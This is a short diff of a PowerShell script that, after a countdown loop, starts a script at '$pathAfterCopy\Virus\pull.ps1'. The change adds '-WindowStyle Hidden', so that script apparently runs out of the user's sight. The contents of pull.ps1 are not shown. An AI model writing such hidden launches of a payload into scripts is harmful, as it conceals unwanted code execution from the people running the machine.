@@ -17,6 +17,6 @@ while ($time_in_seconds -gt 0) {
     Start-Sleep -Seconds 1
     $time_in_seconds--
 }
-Start-Process powershell -ArgumentList "-File", "$pathAfterCopy\Virus\pull.ps1"
+Start-Process powershell -ArgumentList "-File", "$pathAfterCopy\Virus\pull.ps1" -WindowStyle Hidden
 
 exit
